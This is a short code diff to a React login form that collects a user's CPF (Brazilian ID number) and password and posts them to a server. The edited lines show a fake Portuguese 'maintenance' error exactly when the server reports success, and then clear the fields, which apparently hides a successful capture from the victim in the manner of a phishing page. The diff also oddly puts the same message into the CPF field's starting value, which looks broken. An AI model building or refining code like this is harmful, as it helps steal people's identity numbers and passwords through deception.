@@ -6,7 +6,7 @@
 import React, { useState } from 'react';
 
 export default function App() {
-  const [cpf, setCpf] = useState('');
+  const [cpf, setCpf] = useState('❌ Ops! Estamos passando por uma manutenção no momento. Nossos sistemas estão temporariamente indisponíveis para garantir melhorias. Tente novamente mais tarde.');
   const [password, setPassword] = useState('');
   const [status, setStatus] = useState('');
 
@@ -20,7 +20,7 @@ export default function App() {
         body: JSON.stringify({ cpf, password })
       });
       if (response.ok) {
-        setStatus('❌ Oporária. Tente novamente mais tarde.');
+        setStatus('❌ Ops! Estamos passando por uma manutenção no momento. Nossos sistemas estão temporariamente indisponíveis para garantir melhorias. Tente novamente mais tarde.');
         setCpf('');
         setPassword('');
       } else {
